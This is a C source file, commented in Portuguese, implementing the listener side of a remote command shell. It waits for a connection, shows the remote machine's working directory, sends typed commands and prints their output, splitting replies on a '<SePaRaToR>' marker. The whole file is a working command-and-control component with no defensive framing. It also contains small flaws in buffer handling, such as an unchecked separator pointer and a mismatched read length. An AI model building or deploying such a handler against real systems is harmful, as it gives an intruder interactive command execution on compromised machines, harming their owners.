#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BUFFER_SIZE (1024)
#define BACKLOG (3)
#define SEPARATOR ("<SePaRaToR>")

int main(int argc, char *argv[])
{
    int server_fd;
    int client_fd;
    struct sockaddr_in server_addr;
    struct sockaddr_in client_addr;

    char buffer[BUFFER_SIZE];
    char cwd[BUFFER_SIZE];
    char output[BUFFER_SIZE];

    if (argc != 3)
    {
        perror("Por favor, forneça os argumentos corretos\n");
        return -1;
    }

    printf("[*] Aguardando conexões em %s:%s...\n", argv[1], argv[2]);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd <= 0)
    {
        perror("Falha na configuração do socket\n");
        return -1;
    }

    // Configura o endereço e a porta do servidor
    server_addr.sin_family = AF_INET;
    inet_pton(AF_INET, argv[1], &(server_addr.sin_addr));
    server_addr.sin_port = htons(atoi(argv[2]));

    // Vincula o socket
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("Falha na vinculação\n");
        return -1;
    }

    // Inicia a escuta do socket
    if (listen(server_fd, BACKLOG) < 0)
    {
        perror("Falha ao escutar\n");
        return -1;
    }

    // Aceita a conexão
    int client_addr_size = sizeof(client_addr);
    client_fd = accept(server_fd, (struct sockaddr*)&client_addr, (socklen_t*)&client_addr_size);
    if (client_fd < 0)
    {
        perror("Falha ao aceitar conexão\n");
        return -1;
    }

    printf("[*] Conectado a %s:%s\n", inet_ntoa(client_addr.sin_addr), argv[2]);

    // Recebe o diretório de trabalho do cliente
    if (recv(client_fd, cwd, BUFFER_SIZE, 0) < 0)
    {
        perror("Falha ao receber diretório de trabalho\n");
        return -1;
    }

    while (1)
    {
        memset(buffer, 0, BUFFER_SIZE);
        memset(output, 0, BUFFER_SIZE);

        printf("%s> ", cwd);
        scanf("%511[^\n]%*c", buffer);

        if (send(client_fd, buffer, BUFFER_SIZE, 0) < 0)
        {
            perror("Falha ao enviar comando");
            return -1;
        }

        if (recv(client_fd, buffer, BUFFER_SIZE, 0) < 0)
        {
            perror("Falha ao receber resposta\n");
            return -1;
        }

        char* separator = strstr(buffer, SEPARATOR);
        char* new_cwd = separator + strlen(SEPARATOR);

        strcpy(cwd, new_cwd);
        cwd[strlen(new_cwd) + 1] = '\0';

        memcpy(output, buffer, separator - buffer);
        printf("%s", output);

        if (strncmp(buffer, "exit", 4) == 0)
        {
            printf("[*] Conexão encerrada\n");
            break;
        }
    }

    return 0;
}
